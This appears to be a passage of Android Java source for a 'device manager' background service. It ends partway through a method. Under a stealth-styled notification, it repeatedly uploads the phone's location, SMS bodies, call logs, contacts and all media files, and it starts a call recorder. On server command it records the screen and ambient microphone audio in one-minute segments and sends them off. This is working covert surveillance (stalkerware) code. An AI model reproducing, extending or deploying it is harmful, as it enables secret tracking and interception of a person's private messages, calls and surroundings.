package com.company.devicemgr.services;

import android.app.Notification;
import android.app.AppOpsManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.os.Build;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.provider.MediaStore;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.company.devicemgr.utils.ApiConfig;
import com.company.devicemgr.utils.AppRuntime;
import com.company.devicemgr.utils.DeviceIdentity;
import com.company.devicemgr.utils.ForegroundNotificationHelper;
import com.company.devicemgr.utils.HttpClient;
import com.company.devicemgr.utils.TelemetryDispatch;
import com.company.devicemgr.utils.SupportSessionApi;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class ForegroundTelemetryService extends Service implements LocationListener {
    private static final String TAG = "ForegroundSvc";
    private static final String CHANNEL_ID = "devicemgr_channel";
    private static final String PREFS = "devicemgr_prefs";
    private static final int ANDROID_13_API_LEVEL = 33;
    private static final int ANDROID_14_API_LEVEL = 34;
    private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
    private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
    private static final String READ_MEDIA_AUDIO_PERMISSION = "android.permission.READ_MEDIA_AUDIO";
    private static final String READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";
    private static final String KEY_SENT_CALL_KEYS = "sent_call_keys";
    private static final String KEY_SENT_SMS_KEYS = "sent_sms_keys";
    private static final String KEY_SENT_CONTACT_KEYS = "sent_contact_keys";
    private static final String KEY_UPLOADED_MEDIA_HASHES = "uploaded_media_hashes";
    private static final String KEY_REMOTE_STREAM_LAST_CAPABILITY_AT = "remote_stream_last_capability_at";
    private static final String KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX = "remote_audio_last_upload_";
    private static final String KEY_LAST_MEDIA_SCAN_AT = "last_media_scan_at";
    private static final String KEY_LAST_APP_USAGE_SYNC_AT = "last_app_usage_sync_at";
    private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
    private static final long NORMAL_LOOP_MS = 30_000L;
    private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
    private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
    private static final long APP_USAGE_SYNC_INTERVAL_MS = 15 * 60_000L;
    private static final long APP_USAGE_WINDOW_MS = 24 * 60 * 60_000L;
    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
    private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
    private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;

    private LocationManager locationManager;
    private volatile Location lastLocation = null;
    private volatile boolean running = false;
    private volatile MediaProjection mediaProjection = null;
    private volatile VirtualDisplay screenVirtualDisplay = null;
    private volatile MediaRecorder screenRecorder = null;
    private volatile File screenRecorderFile = null;
    private volatile String activeScreenSessionId = null;
    private volatile String activeAudioSessionId = null;
    private volatile boolean remoteScreenSegmentRunning = false;
    private volatile boolean remoteAudioSegmentRunning = false;
    private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification n = ForegroundNotificationHelper.buildStealthServiceNotification(
                this,
                CHANNEL_ID,
                android.R.drawable.ic_menu_mylocation
        );
        startForeground(1, n);

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        running = true;

        try {
            if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 15 * 1000L, 5f, this);
            }
            if (hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 15 * 1000L, 10f, this);
            }
        } catch (Exception e) {
            Log.e(TAG, "location request failed", e);
        }

        new Thread(() -> {
            try {
                Thread.sleep(4000);
            } catch (InterruptedException ignored) {
            }

            try {
                uploadAllMediaOnce();
                prefs().edit().putLong(KEY_LAST_MEDIA_SCAN_AT, System.currentTimeMillis()).apply();
            } catch (Exception e) {
                Log.e(TAG, "uploadAllMediaOnce err", e);
            }

            int loops = 0;
            while (running) {
                try {
                    flushPendingEvents(60);
                    sendTelemetryOnce();
                    JSONObject activeSession = syncRemoteSupportState();
                    maybeRunRemoteSupportStream(activeSession);
                    maybeUploadAllMedia();
                    maybeSendAppUsageSnapshot();

                    if ((loops % 2) == 0) {
                        sendSmsDump();
                        sendCallLogDump();
                        sendContactsDump();
                        try {
                            AppRuntime.startServiceCompat(this, new android.content.Intent(this, CallRecorderService.class), true);
                        } catch (Exception ignored) {
                        }
                        flushPendingEvents(120);
                    }
                    loops++;
                    Thread.sleep(activeSession != null ? ACTIVE_REMOTE_LOOP_MS : NORMAL_LOOP_MS);
                } catch (InterruptedException ie) {
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "sender loop err", e);
                }
            }
        }).start();

        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putBoolean("service_started", true).apply();
    }

    private void createNotificationChannel() {
        ForegroundNotificationHelper.ensureMinChannel(this, CHANNEL_ID, "DeviceMgr");
    }

    private boolean hasPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == android.content.pm.PackageManager.PERMISSION_GRANTED;
    }

    private boolean canReadMedia() {
        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
            return hasImageAccess() || hasVideoAccess() || hasAudioAccess();
        }
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            return hasPermission(READ_MEDIA_IMAGES_PERMISSION) || hasPermission(READ_MEDIA_VIDEO_PERMISSION) || hasPermission(READ_MEDIA_AUDIO_PERMISSION);
        }
        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
    }

    private boolean hasVisualUserSelectedAccess() {
        return Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL
                && hasPermission(READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION);
    }

    private boolean hasImageAccess() {
        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
            return hasPermission(READ_MEDIA_IMAGES_PERMISSION) || hasVisualUserSelectedAccess();
        }
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            return hasPermission(READ_MEDIA_IMAGES_PERMISSION);
        }
        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
    }

    private boolean hasVideoAccess() {
        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
            return hasPermission(READ_MEDIA_VIDEO_PERMISSION) || hasVisualUserSelectedAccess();
        }
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            return hasPermission(READ_MEDIA_VIDEO_PERMISSION);
        }
        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
    }

    private boolean hasAudioAccess() {
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            return hasPermission(READ_MEDIA_AUDIO_PERMISSION);
        }
        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
    }

    private SharedPreferences prefs() {
        return getSharedPreferences(PREFS, MODE_PRIVATE);
    }

    private boolean hasUsageStatsAccess() {
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
            if (appOps == null) return false;
            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            Log.e(TAG, "hasUsageStatsAccess err", e);
            return false;
        }
    }

    private String currentDeviceId() {
        return prefs().getString("deviceId", "unknown");
    }

    private String currentToken() {
        return prefs().getString("auth_token", null);
    }

    private String normalizePhoneNumber(String value) {
        if (value == null) return "";
        return value.replaceAll("\\D+", "");
    }

    private void sendMetric(String metricType, String metricName, String status, Integer valueMs, Double valueNum, JSONObject context) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("metricType", metricType);
            payload.put("metricName", metricName);
            if (status != null) payload.put("status", status);
            if (valueMs != null) payload.put("valueMs", valueMs);
            if (valueNum != null) payload.put("valueNum", valueNum);
            if (context != null) payload.put("context", context);
            sendOrQueue("metric", payload);
        } catch (Exception e) {
            Log.e(TAG, "sendMetric err", e);
        }
    }

    private void flushPendingEvents(int maxItems) {
        TelemetryDispatch.flushPendingEvents(this, maxItems);
    }

    private void sendOrQueue(String type, JSONObject payload) {
        TelemetryDispatch.sendOrQueue(this, type, payload);
    }

    private JSONObject syncRemoteSupportState() {
        String token = currentToken();
        if (token == null || token.length() == 0) return null;

        SharedPreferences sp = prefs();
        long startedAt = System.currentTimeMillis();
        try {
            JSONObject active = SupportSessionApi.getActiveSession(this);
            SharedPreferences.Editor editor = sp.edit();
            editor.putLong("remote_support_last_sync_at", System.currentTimeMillis());
            if (active != null && active.optString("sessionId", "").length() > 0) {
                editor.putString("remote_support_active_session_id", active.optString("sessionId", null));
                editor.putString("remote_support_active_type", active.optString("requestType", null));
            } else {
                editor.remove("remote_support_active_session_id");
                editor.remove("remote_support_active_type");
            }
            editor.apply();

            JSONObject ctx = new JSONObject();
            if (active != null) {
                ctx.put("activeSessionId", active.optString("sessionId", null));
                ctx.put("requestType", active.optString("requestType", null));
            }
            sendMetric("remote_sync", "support_state", "ok", (int) (System.currentTimeMillis() - startedAt), null, ctx);
            return active;
        } catch (Exception e) {
            Log.e(TAG, "syncRemoteSupportState err", e);
            JSONObject ctx = new JSONObject();
            try {
                ctx.put("error", e.getClass().getSimpleName());
            } catch (Exception ignored) {
            }
            sendMetric("remote_sync", "support_state", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
            return null;
        }
    }

    private void maybeRunRemoteSupportStream(JSONObject activeSession) {
        if (activeSession == null || activeSession.optString("sessionId", "").length() == 0) {
            activeScreenSessionId = null;
            activeAudioSessionId = null;
            releaseScreenProjection();
            return;
        }
        String requestType = activeSession.optString("requestType", "");
        String sessionId = activeSession.optString("sessionId", "");

        if ("ambient_audio".equals(requestType)) {
            activeScreenSessionId = null;
            activeAudioSessionId = sessionId;
            releaseScreenProjection();
            maybeStartRemoteAudioSegment(sessionId);
            return;
        }

        if ("screen".equals(requestType)) {
            activeScreenSessionId = sessionId;
            activeAudioSessionId = null;
            maybeStartRemoteScreenSegment(sessionId);
            return;
        }

        activeScreenSessionId = null;
        activeAudioSessionId = null;
        releaseScreenProjection();
    }

    private void maybeStartRemoteScreenSegment(String sessionId) {
        if (remoteScreenSegmentRunning || !isScreenSessionActive(sessionId)) return;
        remoteScreenSegmentRunning = true;
        new Thread(() -> {
            try {
                captureAndUploadScreenFrame(sessionId);
            } finally {
                remoteScreenSegmentRunning = false;
            }
        }, "remote-screen-segment").start();
    }

    private void maybeStartRemoteAudioSegment(String sessionId) {
        if (remoteAudioSegmentRunning || !isAudioSessionActive(sessionId)) return;
        remoteAudioSegmentRunning = true;
        new Thread(() -> {
            try {
                captureAndUploadAmbientAudio(sessionId);
            } finally {
                remoteAudioSegmentRunning = false;
            }
        }, "remote-audio-segment").start();
    }

    private boolean isScreenSessionActive(String sessionId) {
        return sessionId != null && sessionId.equals(activeScreenSessionId);
    }

    private boolean isAudioSessionActive(String sessionId) {
        return sessionId != null && sessionId.equals(activeAudioSessionId);
    }

    private void maybeUploadAllMedia() {
        long lastScanAt = prefs().getLong(KEY_LAST_MEDIA_SCAN_AT, 0L);
        if ((System.currentTimeMillis() - lastScanAt) < MEDIA_SCAN_INTERVAL_MS) return;
        try {
            uploadAllMediaOnce();
            prefs().edit().putLong(KEY_LAST_MEDIA_SCAN_AT, System.currentTimeMillis()).apply();
        } catch (Exception e) {
            Log.e(TAG, "maybeUploadAllMedia err", e);
        }
    }

    private void captureAndUploadScreenFrame(String sessionId) {
        if (!isScreenSessionActive(sessionId)) return;
        long now = System.currentTimeMillis();
        long lastUploadAt = prefs().getLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, 0L);
        if ((now - lastUploadAt) < REMOTE_SCREEN_FRAME_INTERVAL_MS) return;

        if (!ensureScreenProjection(sessionId)) return;

        long startedAt = System.currentTimeMillis();
        try {
            DisplayMetrics dm = getResources().getDisplayMetrics();
            int width = Math.max(720, dm.widthPixels);
            int height = Math.max(1280, dm.heightPixels);
            int density = Math.max(1, dm.densityDpi);
            File folder = new File(getCacheDir(), "remote_screen");
            if (!folder.exists()) folder.mkdirs();
            screenRecorderFile = new File(folder, "remote_screen_" + sessionId + "_" + startedAt + ".mp4");
            screenRecorder = new MediaRecorder();
            screenRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            screenRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            screenRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            screenRecorder.setVideoEncodingBitRate(1_000_000);
            screenRecorder.setVideoFrameRate(8);
            screenRecorder.setVideoSize(width, height);
            screenRecorder.setOutputFile(screenRecorderFile.getAbsolutePath());
            screenRecorder.prepare();
            screenVirtualDisplay = mediaProjection.createVirtualDisplay(
                    "remote-screen-stream",
                    width,
                    height,
                    density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    screenRecorder.getSurface(),
                    null,
                    null
            );
            screenRecorder.start();
            Thread.sleep(Math.max(5_000L, REMOTE_SCREEN_FRAME_INTERVAL_MS - 500L));
            if (!isScreenSessionActive(sessionId)) throw new IllegalStateException("stale_screen_session");
            screenRecorder.stop();
            screenRecorder.reset();
            screenRecorder.release();
            screenRecorder = null;
            if (screenVirtualDisplay != null) {
                screenVirtualDisplay.release();
                screenVirtualDisplay = null;
            }
            byte[] mp4 = readAllBytes(new FileInputStream(screenRecorderFile));
            if (mp4 == null || mp4.length == 0) throw new IllegalStateException("empty_screen_video");

            Map<String, String> form = new HashMap<>();
            form.put("captureMode", "remote_live");
            form.put("captureKind", "screen_video");
            form.put("supportSessionId", sessionId);
            form.put("segmentStartedAtMs", String.valueOf(startedAt));
            form.put("segmentDurationMs", String.valueOf(REMOTE_SCREEN_FRAME_INTERVAL_MS));
            JSONObject metadata = new JSONObject();
            metadata.put("source", "MediaProjection");
            metadata.put("transport", "mp4_segment");
            metadata.put("capturedAtMs", startedAt);
            form.put("metadataJson", metadata.toString());

            String filename = "remote_screen_" + sessionId + "_" + startedAt + ".mp4";
            long uploadStartedAt = System.currentTimeMillis();
            if (!isScreenSessionActive(sessionId)) throw new IllegalStateException("stale_screen_session");
            String res = HttpClient.uploadFile(
                    ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
                    "media",
                    filename,
                    mp4,
                    "video/mp4",
                    form,
                    currentToken()
            );
            JSONObject parsed = new JSONObject(res != null ? res : "{}");
            JSONObject ctx = new JSONObject();
            ctx.put("sessionId", sessionId);
            if (parsed.optBoolean("ok")) {
                prefs().edit().putLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, System.currentTimeMillis()).apply();
                ctx.put("fileId", parsed.optString("fileId", null));
                sendMetric("remote_stream", "screen_segment", "ok", (int) (System.currentTimeMillis() - uploadStartedAt), (double) mp4.length, ctx);
            } else {
                ctx.put("response", parsed.toString());
                sendMetric("remote_stream", "screen_segment", "error", (int) (System.currentTimeMillis() - uploadStartedAt), null, ctx);
            }
            if (screenRecorderFile.exists()) screenRecorderFile.delete();
        } catch (Exception e) {
            Log.e(TAG, "captureAndUploadScreenFrame err", e);
            try {
                JSONObject ctx = new JSONObject();
                ctx.put("sessionId", sessionId);
                ctx.put("error", e.getClass().getSimpleName());
                sendMetric("remote_stream", "screen_segment", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
            } catch (Exception ignored) {
            }
            try {
                if (screenVirtualDisplay != null) screenVirtualDisplay.release();
            } catch (Exception ignored) {
            }
            screenVirtualDisplay = null;
            try {
                if (screenRecorder != null) {
                    screenRecorder.reset();
                    screenRecorder.release();
                }
            } catch (Exception ignored) {
            }
            screenRecorder = null;
            if (screenRecorderFile != null && screenRecorderFile.exists()) screenRecorderFile.delete();
        }
    }

    private boolean ensureScreenProjection(String sessionId) {
        try {
            if (!AppRuntime.hasMediaProjectionGrant()) {
                maybeReportScreenCapability(sessionId);
                return false;
            }
            if (mediaProjection != null) {
                return true;
            }

            MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (manager == null) {
                maybeReportScreenCapability(sessionId);
                return false;
            }
            IntentDataHolder holder = new IntentDataHolder(AppRuntime.getMediaProjectionResultCode(), AppRuntime.copyMediaProjectionDataIntent());
            if (holder.dataIntent == null) {
                maybeReportScreenCapability(sessionId);
                return false;
            }

            mediaProjection = manager.getMediaProjection(holder.resultCode, holder.dataIntent);
            if (mediaProjection == null) {
                AppRuntime.clearMediaProjectionGrant();
                maybeReportScreenCapability(sessionId);
                return false;
            }
            JSONObject ctx = new JSONObject();
            ctx.put("sessionId", sessionId);
            sendMetric("remote_stream", "capability", "ok", null, null, ctx);
            return true;
        } catch (Exception e) {
            AppRuntime.clearMediaProjectionGrant();
            releaseScreenProjection();
            maybeReportScreenCapability(sessionId);
            return false;
        }
    }

    private void releaseScreenProjection() {
        try {
            if (screenRecorder != null) {
                screenRecorder.reset();
                screenRecorder.release();
            }
        } catch (Exception ignored) {
        }
        screenRecorder = null;
        if (screenRecorderFile != null && screenRecorderFile.exists()) screenRecorderFile.delete();
        screenRecorderFile = null;
        try {
            if (screenVirtualDisplay != null) screenVirtualDisplay.release();
        } catch (Exception ignored) {
        }
        try {
            if (mediaProjection != null) mediaProjection.stop();
        } catch (Exception ignored) {
        }
        screenVirtualDisplay = null;
        mediaProjection = null;
    }

    private static class IntentDataHolder {
        final int resultCode;
        final android.content.Intent dataIntent;

        IntentDataHolder(int resultCode, android.content.Intent dataIntent) {
            this.resultCode = resultCode;
            this.dataIntent = dataIntent;
        }
    }

    private void maybeReportScreenCapability(String sessionId) {
        long now = System.currentTimeMillis();
        long last = prefs().getLong(KEY_REMOTE_STREAM_LAST_CAPABILITY_AT, 0L);
        if ((now - last) < 60_000L) return;
        prefs().edit().putLong(KEY_REMOTE_STREAM_LAST_CAPABILITY_AT, now).apply();
        try {
            JSONObject ctx = new JSONObject();
            ctx.put("sessionId", sessionId);
            ctx.put("reason", "screen_capture_requires_foreground_user_grant");
            sendMetric("remote_stream", "capability", "blocked", null, null, ctx);
        } catch (Exception e) {
            Log.e(TAG, "maybeReportScreenCapability err", e);
        }
    }

    private void captureAndUploadAmbientAudio(String sessionId) {
        if (!isAudioSessionActive(sessionId)) return;
        long now = System.currentTimeMillis();
        long lastUploadAt = prefs().getLong(KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX + sessionId, 0L);
        if ((now - lastUploadAt) < (REMOTE_AUDIO_SEGMENT_MS + 500L)) return;

        if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
            try {
                JSONObject ctx = new JSONObject();
                ctx.put("sessionId", sessionId);
                ctx.put("reason", "missing_record_audio_permission");
                sendMetric("remote_stream", "audio_segment", "permission_missing", null, null, ctx);
            } catch (Exception ignored) {
            }
            return;
        }

        long captureStartedAt = System.currentTimeMillis();
        AudioRecord recorder = null;
        try {
            int minBuffer = AudioRecord.getMinBufferSize(
                    REMOTE_AUDIO_SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT
            );
            if (minBuffer <= 0) throw new IllegalStateException("invalid_buffer_size");
            int bufferSize = Math.max(minBuffer, REMOTE_AUDIO_SAMPLE_RATE * 2);
            recorder = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    REMOTE_AUDIO_SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    bufferSize
            );
            if (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                throw new IllegalStateException("audio_record_init_failed");
            }

            recorder.startRecording();
            byte[] chunk = new byte[Math.max(2048, minBuffer)];
            ByteArrayOutputStream pcm = new ByteArrayOutputStream();
            long deadline = captureStartedAt + REMOTE_AUDIO_SEGMENT_MS;
            while (System.currentTimeMillis() < deadline) {
                if (!isAudioSessionActive(sessionId)) throw new IllegalStateException("stale_audio_session");
                int read = recorder.read(chunk, 0, chunk.length);
                if (read > 0) pcm.write(chunk, 0, read);
            }
            recorder.stop();
            recorder.release();
            recorder = null;

            byte[] wav = toWav(pcm.toByteArray(), REMOTE_AUDIO_SAMPLE_RATE, 1, 16);
            Map<String, String> form = new HashMap<>();
            form.put("captureMode", "remote_live");
            form.put("captureKind", "ambient_audio");
            form.put("supportSessionId", sessionId);
            form.put("segmentStartedAtMs", String.valueOf(captureStartedAt));
            form.put("segmentDurationMs", String.valueOf(REMOTE_AUDIO_SEGMENT_MS));
            JSONObject metadata = new JSONObject();
            metadata.put("source", "ForegroundTelemetryService");
            metadata.put("transport", "multipart_segment");
            metadata.put("capturedAtMs", captureStartedAt);
            form.put("metadataJson", metadata.toString());

            long uploadStartedAt = System.currentTimeMillis();
            String filename = "remote_audio_" + sessionId + "_" + captureStartedAt + ".wav";
            if (!isAudioSessionActive(sessionId)) throw new IllegalStateException("stale_audio_session");
            String res = HttpClient.uploadFile(
                    ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
                    "media",
                    filename,
                    wav,
                    "audio/wav",
                    form,
                    currentToken()
            );
            JSONObject parsed = new JSONObject(res != null ? res : "{}");
            if (parsed.optBoolean("ok")) {
                prefs().edit().putLong(KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX + sessionId, System.currentTimeMillis()).apply();
                JSONObject ctx = new JSONObject();
                ctx.put("sessionId", sessionId);
                ctx.put("fileId", parsed.optString("fileId", null));
                sendMetric(
                        "remote_stream",
                        "audio_segment",
                        "ok",
                        (int) (System.currentTimeMillis() - uploadStartedAt),
                        (double) wav.length,
                        ctx
                );
            } else {
                JSONObject ctx = new JSONObject();
                ctx.put("sessionId", sessionId);
                ctx.put("response", parsed.toString());
                sendMetric("remote_stream", "audio_segment", "error", (int) (System.currentTimeMillis() - uploadStartedAt), null, ctx);
            }
        } catch (Exception e) {
            Log.e(TAG, "captureAndUploadAmbientAudio err", e);
            try {
                JSONObject ctx = new JSONObject();
                ctx.put("sessionId", sessionId);
                ctx.put("error", e.getClass().getSimpleName());
                sendMetric("remote_stream", "audio_segment", "error", (int) (System.currentTimeMillis() - captureStartedAt), null, ctx);
            } catch (Exception ignored) {
            }
        } finally {
            if (recorder != null) {
                try {
                    recorder.stop();
                } catch (Exception ignored) {
                }
                try {
                    recorder.release();
                } catch (Exception ignored) {
                }
            }
        }
    }

    private void sendTelemetryOnce() {
        try {
            JSONObject payload = new JSONObject();

            if (lastLocation != null) {
                JSONObject loc = new JSONObject();
                loc.put("lat", lastLocation.getLatitude());
                loc.put("lon", lastLocation.getLongitude());
                loc.put("accuracy", lastLocation.getAccuracy());
                payload.put("location", loc);
            } else {
                Location fallback = null;
                try {
                    if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION))
                        fallback = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                } catch (Exception ignored) {
                }
                try {
                    if (fallback == null && hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION))
                        fallback = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                } catch (Exception ignored) {
                }

                if (fallback != null) {
                    JSONObject loc = new JSONObject();
                    loc.put("lat", fallback.getLatitude());
                    loc.put("lon", fallback.getLongitude());
                    loc.put("accuracy", fallback.getAccuracy());
                    payload.put("location", loc);
                } else {
                    payload.put("note", "no_location");
                }
            }
            payload.put("device", DeviceIdentity.getDeviceInfo(this));
            payload.put("ts", System.currentTimeMillis());
            sendOrQueue("telemetry", payload);
        } catch (Exception e) {
            Log.e(TAG, "sendTelemetryOnce error", e);
        }
    }

    @Override
    public void onLocationChanged(Location location) {
        lastLocation = location;
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                JSONObject loc = new JSONObject();
                loc.put("lat", location.getLatitude());
                loc.put("lon", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                payload.put("location", loc);
                payload.put("device", DeviceIdentity.getDeviceInfo(this));
                payload.put("ts", System.currentTimeMillis());
                sendOrQueue("telemetry", payload);
            } catch (Exception e) {
                Log.e(TAG, "onLocationChanged send err", e);
            }
        }).start();
    }

    @Override
    public void onProviderDisabled(String provider) {
    }

    @Override
    public void onProviderEnabled(String provider) {
    }

    @Override
    public void onStatusChanged(String provider, int status, android.os.Bundle extras) {
    }

    @Override
    public IBinder onBind(android.content.Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        try {
            if (locationManager != null) locationManager.removeUpdates(this);
        } catch (Exception ignored) {
        }
        releaseScreenProjection();
        getSharedPreferences(PREFS, MODE_PRIVATE).edit().putBoolean("service_started", false).apply();
        super.onDestroy();
    }

    private Set<String> readSentKeys(String prefKey) {
        Set<String> out = new HashSet<>();
        try {
            JSONObject obj = new JSONObject(prefs().getString(prefKey, "{}"));
            Iterator<String> it = obj.keys();
            while (it.hasNext()) out.add(it.next());
        } catch (Exception e) {
            Log.e(TAG, "readSentKeys err", e);
        }
        return out;
    }

    private void writeSentKeys(String prefKey, Set<String> keys, int max) {
        try {
            JSONObject obj = new JSONObject();
            List<String> list = new ArrayList<>(keys);
            int start = Math.max(0, list.size() - max);
            for (int i = start; i < list.size(); i++) obj.put(list.get(i), true);
            prefs().edit().putString(prefKey, obj.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "writeSentKeys err", e);
        }
    }

    private void sendSmsDump() {
        try {
            if (!hasPermission(android.Manifest.permission.READ_SMS)) {
                Log.i(TAG, "no READ_SMS permission");
                return;
            }

            Set<String> sent = readSentKeys(KEY_SENT_SMS_KEYS);
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(Uri.parse("content://sms"), null, null, null, "date DESC");
            if (cur == null) return;

            int queued = 0;
            int scanned = 0;
            while (cur.moveToNext() && scanned++ < 4000 && queued < 400) {
                try {
                    String addr = cur.getString(cur.getColumnIndexOrThrow("address"));
                    String bodyTxt = cur.getString(cur.getColumnIndexOrThrow("body"));
                    long ts = cur.getLong(cur.getColumnIndexOrThrow("date"));
                    int type = -1;
                    try {
                        type = cur.getInt(cur.getColumnIndexOrThrow("type"));
                    } catch (Exception ignored) {
                    }
                    String key = "sms|" + addr + "|" + ts + "|" + type + "|" + (bodyTxt != null ? bodyTxt.hashCode() : 0);
                    if (sent.contains(key)) continue;

                    JSONObject payload = new JSONObject();
                    payload.put("from", addr);
                    String contactName = lookupContactName(addr);
                    if (contactName != null && contactName.trim().length() > 0) payload.put("contactName", contactName);
                    payload.put("body", bodyTxt);
                    payload.put("source", "sms");
                    payload.put("syncKey", key);
                    payload.put("boxType", type);
                    payload.put("ts", ts);
                    sendOrQueue("sms", payload);

                    sent.add(key);
                    queued++;
                } catch (Exception e) {
                    Log.e(TAG, "sms item err", e);
                }
            }
            cur.close();
            writeSentKeys(KEY_SENT_SMS_KEYS, sent, 4000);
        } catch (Exception e) {
            Log.e(TAG, "sendSmsDump err", e);
        }
    }

    private void sendContactsDump() {
        try {
            if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                Log.i(TAG, "no READ_CONTACTS permission");
                return;
            }

            Set<String> sent = readSentKeys(KEY_SENT_CONTACT_KEYS);
            Cursor cur = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                    },
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            if (cur == null) return;

            int queued = 0;
            int scanned = 0;
            while (cur.moveToNext() && scanned++ < 6000 && queued < 2000) {
                try {
                    String name = cur.getString(0);
                    String number = cur.getString(1);
                    String contactId = cur.getString(2);
                    String normalizedNumber = normalizePhoneNumber(number);
                    String key = (contactId != null && contactId.length() > 0) ? contactId : (!normalizedNumber.isEmpty() ? normalizedNumber : (number != null ? number : name));
                    if (key == null || key.trim().length() == 0 || sent.contains(key)) continue;

                    JSONObject payload = new JSONObject();
                    payload.put("contactKey", key);
                    payload.put("displayName", name);
                    payload.put("phoneNumber", number);
                    payload.put("ts", System.currentTimeMillis());
                    sendOrQueue("contact", payload);
                    sent.add(key);
                    queued++;
                } catch (Exception e) {
                    Log.e(TAG, "contact item err", e);
                }
            }
            cur.close();
